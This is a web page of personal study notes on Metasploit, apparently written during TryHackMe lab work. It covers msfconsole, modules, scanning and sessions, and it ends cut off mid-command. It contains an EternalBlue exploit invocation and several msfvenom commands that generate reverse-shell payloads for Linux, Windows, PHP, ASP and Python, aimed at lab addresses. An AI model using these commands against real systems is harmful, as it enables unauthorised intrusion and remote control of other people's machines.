<!doctype html>
<html class="docs-version-current" lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="generator" content="Docusaurus v2.0.0-beta.14">
<link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="The NENmSIS project RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="The NENmSIS project Atom Feed"><title data-react-helmet="true">Metasploit | The NENmSIS project</title><meta data-react-helmet="true" name="twitter:card" content="summary_large_image"><meta data-react-helmet="true" property="og:url" content="https://NENmSIS.github.io/docs/Cibersecurity/Metasploit"><meta data-react-helmet="true" name="docusaurus_locale" content="en"><meta data-react-helmet="true" name="docusaurus_version" content="current"><meta data-react-helmet="true" name="docusaurus_tag" content="docs-default-current"><meta data-react-helmet="true" property="og:title" content="Metasploit | The NENmSIS project"><meta data-react-helmet="true" name="description" content="Main Components of Metasploit"><meta data-react-helmet="true" property="og:description" content="Main Components of Metasploit"><link data-react-helmet="true" rel="icon" href="/img/avatargithub.jpg"><link data-react-helmet="true" rel="canonical" href="https://NENmSIS.github.io/docs/Cibersecurity/Metasploit"><link data-react-helmet="true" rel="alternate" href="https://NENmSIS.github.io/docs/Cibersecurity/Metasploit" hreflang="en"><link data-react-helmet="true" rel="alternate" href="https://NENmSIS.github.io/docs/Cibersecurity/Metasploit" hreflang="x-default"><link rel="stylesheet" href="/assets/css/styles.54ef634c.css">
<link rel="preload" href="/assets/js/runtime~main.3e9c2769.js" as="script">
<link rel="preload" href="/assets/js/main.edc28e48.js" as="script">
</head>
<body>
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}()</script><div id="__docusaurus">
<div><a href="#" class="skipToContent_OuoZ">Skip to main content</a></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Navigation bar toggle" class="navbar__toggle clean-btn" type="button" tabindex="0"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/avatargithub.jpg" alt="NENmSIS Logo" class="themedImage_TMUO themedImage--light_4Vu1"><img src="/img/avatargithub.jpg" alt="NENmSIS Logo" class="themedImage_TMUO themedImage--dark_uzRr"></div><b class="navbar__title">NENmSIS</b></a><a class="navbar__item navbar__link navbar__link--active" href="/docs/intro">Docs</a><a class="navbar__item navbar__link" href="/blog">Blog</a></div><div class="navbar__items navbar__items--right"><div class="navbar__item dropdown dropdown--hoverable dropdown--right"><a href="#" class="navbar__link">Socials</a><ul class="dropdown__menu"><li><a href="mailto:nenmsis@protonmail.com" target="_blank" rel="noopener noreferrer" class="dropdown__link"><span>Email<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_wgqa"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li><li><a href="https://t.me/NENmSIS" target="_blank" rel="noopener noreferrer" class="dropdown__link"><span>Telegram<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_wgqa"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li><li><a href="https://github.com/NENmSIS" target="_blank" rel="noopener noreferrer" class="dropdown__link"><span>GitHub<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_wgqa"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li><li><a href="https://tryhackme.com/p/NENmSIS" target="_blank" rel="noopener noreferrer" class="dropdown__link"><span>THM<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_wgqa"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li></ul></div><div class="toggle_iYfV toggle_2i4l toggleDisabled_xj38"><div class="toggleTrack_t-f2" role="button" tabindex="-1"><div class="toggleTrackCheck_mk7D"><span class="toggleIcon_pHJ9">ðŸŒœ</span></div><div class="toggleTrackX_dm8H"><span class="toggleIcon_pHJ9">ðŸŒž</span></div><div class="toggleTrackThumb_W6To"></div></div><input type="checkbox" class="toggleScreenReader_h9qa" aria-label="Switch between dark and light mode"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div class="main-wrapper docs-wrapper docs-doc-page"><div class="docPage_lDyR"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_i9tI" type="button"></button><aside class="docSidebarContainer_0YBq"><div class="sidebar_a3j0"><nav class="menu thin-scrollbar menu_cyFh"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/intro">DocumentaciÃ³n</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active hasHref_TwRn" href="/docs/Cibersecurity/Bookmarks">Cibersecurity</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Cibersecurity/Bookmarks">Bookmarks</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Cibersecurity/Cheatsheet">Cheatsheet</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Cibersecurity/Linux Privilege Escalation">Linux Privilege Escalation</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/Cibersecurity/Metasploit">Metasploit</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Cibersecurity/Network Services">Network Services</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Cibersecurity/Nmap">Nmap</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Cibersecurity/Passive Reconnaisance">Passive Reconnaisance</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Cibersecurity/Shells">Shells</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Cibersecurity/THC Hydra">THC Hydra</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist hasHref_TwRn" tabindex="0" href="/docs/Cibersecurity/Writeups/Archetype">Writeups</a></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist hasHref_TwRn" href="/docs/Configurations/Docusaurus-configuration">Configurations</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist hasHref_TwRn" href="/docs/Investissements/ETF">Investissements</a></div></li></ul></nav></div></aside><main class="docMainContainer_r8cw"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_zHA2"><div class="docItemContainer_oiyr"><article><div class="tocCollapsible_aw-L theme-doc-toc-mobile tocMobile_Tx6Y"><button type="button" class="clean-btn tocCollapsibleButton_zr6a">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Metasploit</h1></header><h2 class="anchor anchorWithStickyNavbar_y2LR" id="main-components-of-metasploit">Main Components of Metasploit<a class="hash-link" href="#main-components-of-metasploit" title="Direct link to heading">â€‹</a></h2><p>To launch Metasploit, use the <code>msfconsole</code> command. </p><h3 class="anchor anchorWithStickyNavbar_y2LR" id="modules">Modules<a class="hash-link" href="#modules" title="Direct link to heading">â€‹</a></h3><div class="codeBlockContainer_J+bg language-bash theme-code-block"><div class="codeBlockContent_csEI bash"><pre tabindex="0" class="prism-code language-bash codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">/usr/share/metasploit-framework/modules/</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><ul><li><strong>Auxiliary:</strong> Any supporting module, such as scanners, crawlers and fuzzers, can be found here. </li><li><strong>Encoders:</strong> Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.</li><li><strong>Evasion:</strong> While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software. </li><li><strong>Exploits:</strong> Exploits, neatly organized by target system.</li><li><strong>Payloads:</strong> Payloads are codes that will run on the target system. To identify the single and staged payloads, it&#x27;s important to look for &quot;_&quot; between &quot;shell&quot; and &quot;reverse&quot;. A staged payload is indicated by the &quot;/&quot;.<ul><li><strong>Singles:</strong> Self-contained payloads.</li><li><strong>Stagers:</strong> Responsible for setting up a connection channel between Metasploit and the target system.</li><li><strong>Stages:</strong> Downloaded by the stager. This will allow you to use larger sized payloads.</li></ul></li><li><strong>Post:</strong> Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation.</li></ul><h3 class="anchor anchorWithStickyNavbar_y2LR" id="msfconsole">Msfconsole<a class="hash-link" href="#msfconsole" title="Direct link to heading">â€‹</a></h3><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">msfconsole</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>The Metasploit console (msfconsole) can be used just like a regular command-line shell.
You can use the history command to see commands you have typed earlier.
Usage example:</p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">use exploit/windows/smb/ms17_010_eternalblue</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>The prompt tells us we now have a context set in which we will work. You can see this by typing the <code>show options</code> command.
The <code>show</code> command can be used in any context followed by a module type (auxiliary, payload, exploit, etc.) to list available modules.
You can leave the context using the <code>back</code> command.
Further information on any module can be obtained by typing the <code>info</code> command within its context.
One of the most useful commands in msfconsole is <code>search</code>. You can conduct searches using CVE numbers, exploit names (eternalblue, heartbleed, etc.), or target system. We can also search for specific module types:</p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">search type:auxiliary telnet</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><h3 class="anchor anchorWithStickyNavbar_y2LR" id="working-with-modules">Working with modules<a class="hash-link" href="#working-with-modules" title="Direct link to heading">â€‹</a></h3><p>Once you have entered the context of a module using the <code>use</code> command followed by the module name, you will need to set parameters. It is good practice to use the <code>show options</code> command to list the required parameters.
All parameters are set using the same command syntax: <code>set PARAMETER_NAME VALUE</code></p><p>Some of these parameters require a value for the exploit to work.</p><p>Parameters you will often use:</p><ul><li><p><strong>RHOSTS:</strong> Remote host</p></li><li><p><strong>RPORT:</strong> Remote port</p></li><li><p><strong>LHOST:</strong> Localhost</p></li><li><p><strong>LPORT:</strong> Local port</p></li><li><p><strong>SESSION:</strong> Each connectoin established to the target system using Metasploit.</p><p>You can override any set parameter using the set command again with a different value. You can also clear any parameter value using the <code>unset</code> command or clear all set parameters with the <code>unset</code> all command.
You can use the <code>setg</code> command to set values that will be used for all modules (it can be used across different modules). </p></li></ul><h3 class="anchor anchorWithStickyNavbar_y2LR" id="using-modules">Using modules<a class="hash-link" href="#using-modules" title="Direct link to heading">â€‹</a></h3><p>Once all module parameters are set, you can launch the module using the <code>exploit</code> command. We can also use <code>run</code>.
The <code>exploit</code> command can be used without any parameters or using the <code>-z</code> parameter. The <code>exploit -z</code> command will run the exploit and background the session as soon as it opens. Some modules support the <code>check</code> option.</p><h3 class="anchor anchorWithStickyNavbar_y2LR" id="sessions">Sessions<a class="hash-link" href="#sessions" title="Direct link to heading">â€‹</a></h3><p>This is the communication channel established between the target system and Metasploit. You can use the <code>background</code> command to background the session prompt and go back to the msfconsole prompt. Alternatively, we can also use <code>CTRL+Z</code>.
To interact with any session, you can use the sessions -i command followed by the desired session number</p><h4 class="anchor anchorWithStickyNavbar_y2LR" id="types-of-prompts">Types of prompts<a class="hash-link" href="#types-of-prompts" title="Direct link to heading">â€‹</a></h4><p>When dealing with Metasploit, you may see five different prompts:</p><ul><li>The regular command prompt: You can not use Metasploit commands here.</li></ul><div class="codeBlockContainer_J+bg language-console theme-code-block"><div class="codeBlockContent_csEI console"><pre tabindex="0" class="prism-code language-console codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">root@ip-10-10-XX-XX:~#</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><ul><li>The msfconsole prompt: no context is set here, so context-specific commands to set parameters and run modules can not be used here.</li></ul><div class="codeBlockContainer_J+bg language-console theme-code-block"><div class="codeBlockContent_csEI console"><pre tabindex="0" class="prism-code language-console codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">msf5 &gt;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><ul><li>A context prompt: Once you have decided to use a module and used the set command to chose it, the msfconsole will show the context. You can use context-specific commands (e.g. set RHOSTS 10.10.x.x) here.</li></ul><div class="codeBlockContainer_J+bg language-cosole theme-code-block"><div class="codeBlockContent_csEI cosole"><pre tabindex="0" class="prism-code language-cosole codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><ul><li>  The Meterpreter prompt: Meterpreter is an important payload we will see in detail later in this module. This means a Meterpreter agent was loaded to the target system and connected back to you. You can use Meterpreter specific commands here.</li></ul><div class="codeBlockContainer_J+bg language-console theme-code-block"><div class="codeBlockContent_csEI console"><pre tabindex="0" class="prism-code language-console codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter &gt;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><ul><li>A shell on the target system: Once the exploit is completed, you may have access to a command shell on the target system. This is a regular command line, and all commands typed here run on the target system.</li></ul><div class="codeBlockContainer_J+bg language-console theme-code-block"><div class="codeBlockContent_csEI console"><pre tabindex="0" class="prism-code language-console codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">C:\Windows\system32&gt;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><h2 class="anchor anchorWithStickyNavbar_y2LR" id="exploitation">Exploitation<a class="hash-link" href="#exploitation" title="Direct link to heading">â€‹</a></h2><h3 class="anchor anchorWithStickyNavbar_y2LR" id="scanning">Scanning<a class="hash-link" href="#scanning" title="Direct link to heading">â€‹</a></h3><h4 class="anchor anchorWithStickyNavbar_y2LR" id="port-scanning">Port Scanning<a class="hash-link" href="#port-scanning" title="Direct link to heading">â€‹</a></h4><p> You can list potential port scanning modules available using the <code>search portscan</code> command.
Port scanning modules will require you to set a few options:</p><ul><li><strong>CONCURRENCY:</strong> Number of targets to be scanned simultaneously.</li><li><strong>PORTS:</strong> Port range to be scanned.</li><li><strong>RHOSTS:</strong> Target or target network to be scanned.</li><li><strong>THREADS:</strong> Number of threads that will be used simultaneously. More threads will result in faster scans. </li></ul><p>You can directly perform Nmap scans from the msfconsole prompt as shown below faster:</p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">msf6 &gt; nmap -sS 10.10.12.229</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><h4 class="anchor anchorWithStickyNavbar_y2LR" id="udp-service-identification">UDP service identification<a class="hash-link" href="#udp-service-identification" title="Direct link to heading">â€‹</a></h4><p>The <code>scanner/discovery/udp_sweep</code> module will allow you to quickly identify services running over the UDP (User Datagram Protocol).</p><h4 class="anchor anchorWithStickyNavbar_y2LR" id="smb-scans">SMB Scans<a class="hash-link" href="#smb-scans" title="Direct link to heading">â€‹</a></h4><p>Especially useful in a corporate network would be <code>smb_enumshares</code> and <code>smb_version</code>.</p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">msf6 &gt; use auxiliary/scanner/smb/smb_version</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><h3 class="anchor anchorWithStickyNavbar_y2LR" id="the-metasploit-database">The Metasploit Database<a class="hash-link" href="#the-metasploit-database" title="Direct link to heading">â€‹</a></h3><p>Metasploit has a database function to simplify project management and avoid possible confusion when setting up parameter values.
You will first need to start the PostgreSQL database, which Metasploit will use with the following command:
<code>systemctl start postgresql</code>.
Then you will need to initialize the Metasploit Database using the <code>msfdb init</code> command.</p><p>You can now launch <code>msfconsole</code> and check the database status using the <code>db_status</code> command.</p><p>The database feature will allow you to create workspaces to isolate different projects. When first launched, you should be in the default workspace. You can list available workspaces using the <code>workspace</code> command.
You can add a workspace using the <code>-a</code> parameter or delete a workspace using the <code>-d</code> parameter, respectively.</p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">msf6 &gt; workspace -a tryhackme</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>You will also notice that the new database name is printed in red, starting with a <code>*</code> symbol.
You can use the workspace command to navigate between workspaces simply by typing <code>workspace</code> followed by the desired workspace name.
You can use the <code>workspace -h</code> command to list available options for the <code>workspace</code> command.
Different from regular Metasploit usage, once Metasploit is launched with a database, the <code>help</code> command, you will show the Database Backends Commands menu.
If you run a Nmap scan using the <code>db_nmap</code> shown below, all results will be saved to the database. </p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">msf6 &gt; db_nmap -sV -p- 10.10.12.229</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>You can now reach information relevant to hosts and services running on target systems with the <code>hosts</code> and <code>services</code> commands, respectively.</p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">msf6 &gt; hosts</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 &gt; services</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>The <code>hosts -h</code> and <code>services -h</code> commands can help you become more familiar with available options. </p><h3 class="anchor anchorWithStickyNavbar_y2LR" id="vulnerability-scanning">Vulnerability scanning<a class="hash-link" href="#vulnerability-scanning" title="Direct link to heading">â€‹</a></h3><p>After finding any service running on the target, we can use vulnerability scanner&#x27;s modules to enumerate.
Example:</p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">msf6 &gt; use auxiliary/scanner/vnc/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 auxiliary(scanner/vnc/vnc_login) &gt; info</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><h3 class="anchor anchorWithStickyNavbar_y2LR" id="exploitation-1">Exploitation<a class="hash-link" href="#exploitation-1" title="Direct link to heading">â€‹</a></h3><p>Most of the exploits will have a preset default payload. However, you can always use the <code>show payloads</code> command to list other commands you can use with that specific exploit.</p><p>Once you have decided on the payload, you can use the <code>set payload</code> command to make your choice.</p><p>Note that choosing a working payload could become a trial and error process due to environmental or OS restrictions such as firewall rules, anti-virus, file writing, or the program performing the payload execution isn&#x27;t available (eg. payload/python/shell_reverse_tcp).</p><p>Some payloads will open new parameters that you may need to set, running the <code>show options</code> command once more can show these. As you can see in the above example, a reverse payload will at least require you to set the <code>LHOST</code> option.</p><p>Once a session is opened, you can background it using <code>CTRL+Z</code> or abort it using <code>CTRL+C</code>. Backgrounding a session will be useful when working on more than one target simultaneously or on the same target with a different exploit and/or shell. </p><h4 class="anchor anchorWithStickyNavbar_y2LR" id="working-with-sessions">Working with sessions<a class="hash-link" href="#working-with-sessions" title="Direct link to heading">â€‹</a></h4><p>The <code>sessions</code> command will list all active sessions.</p><p>You can interact with any existing session using the <code>sessions -i</code> command followed by the session ID.</p><h3 class="anchor anchorWithStickyNavbar_y2LR" id="msfvenom">Msfvenom<a class="hash-link" href="#msfvenom" title="Direct link to heading">â€‹</a></h3><p>Msfvenom allows to generate payloads in many different formats for many different target systems. <code>msfvenom -l payloads</code>.</p><h4 class="anchor anchorWithStickyNavbar_y2LR" id="output-formats">Output formats<a class="hash-link" href="#output-formats" title="Direct link to heading">â€‹</a></h4><p>You can either generate stand-alone payloads or get a usable raw format. The <code>msfvenom --list</code> formats command can be used to list supported output formats.</p><h4 class="anchor anchorWithStickyNavbar_y2LR" id="encoders">Encoders<a class="hash-link" href="#encoders" title="Direct link to heading">â€‹</a></h4><p>They encode the payload (do not aim to bypass antivirus). The usage is <code>-e</code> parameter and the output parameter <code>-f</code>.
Example:</p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><h4 class="anchor anchorWithStickyNavbar_y2LR" id="handlers">Handlers<a class="hash-link" href="#handlers" title="Direct link to heading">â€‹</a></h4><p> When using an exploit module, this part is automatically handled by the exploit module.</p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw &gt; reverse_shell.php</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p> Please note: The output PHP file will miss the starting PHP tag commented and the end tag (?&gt;), as seen below. <code>/*&lt;?php /**/</code>
The reverse_shell.php file should be edited to convert it into a working PHP file.
Comments removed from the beginning of the file.  <code>&lt;?php</code>
End tag added <code>?&gt;</code></p><p>We will use Multi Handler to receive the incoming connection. The module can be used with the <code>use exploit/multi/handler</code> command.
To use the module, we will need to set the payload value (<code>php/reverse_php</code> in this case), the LHOST, and LPORT values. Also, it is important to select the payload generated.</p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">set payload linux/x86/meterpreter/reverse_tcp</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>Once everything is set, we will <code>run</code> the handler and wait for the incoming connection.
When the reverse shell is triggered, the connection will be received by multi/handler and provide us with a shell. </p><h4 class="anchor anchorWithStickyNavbar_y2LR" id="other-payloads">Other payloads<a class="hash-link" href="#other-payloads" title="Direct link to heading">â€‹</a></h4><p>Examples:</p><ul><li>Linux Executable and Linkable Format (elf)</li></ul><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf &gt; rev_shell.elf</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><ul><li>Windows</li></ul><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe &gt; rev_shell.exe</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><ul><li>PHP</li></ul><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw &gt; rev_shell.php</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><ul><li>ASP</li></ul><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp &gt; rev_shell.asp</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><ul><li>Python</li></ul><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw &gt; 